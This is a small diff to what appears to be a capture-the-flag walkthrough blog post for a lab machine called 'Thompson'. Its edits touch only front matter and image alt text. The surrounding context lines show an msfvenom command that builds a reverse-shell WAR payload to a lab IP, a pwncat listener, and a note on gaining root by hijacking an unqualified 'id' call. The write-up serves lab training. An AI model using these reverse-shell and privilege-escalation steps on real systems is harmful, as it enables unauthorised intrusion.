@@ -1,5 +1,5 @@
 ---
-layout: post
+
 title: Walkthrough - Thompson
 published: true
 ---
@@ -77,13 +77,13 @@ Now that we have access we can upload a java .war shell and setup a `pwncat` lis
 - `msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.2.127.225 LPORT=6969 -f war -o shell.war`
 - `pwncat-cs -lp 6969`
 
-![](/assets/thompson01.png)
+![0xskar](/assets/thompson01.png)
 
 * * * 
 
 ## What is the user flag?
 
-![](/assets/thompson02.png)
+![0xskar](/assets/thompson02.png)
 
 * * * 
 
@@ -100,7 +100,7 @@ id > test.txt
 
 this script is just running id but it isnt using the intire path to id so if we create another script called id we can open up a root shell
 
-![](/assets/thompson03.png)
+![0xskar](/assets/thompson03.png)
 
 * * * 
 
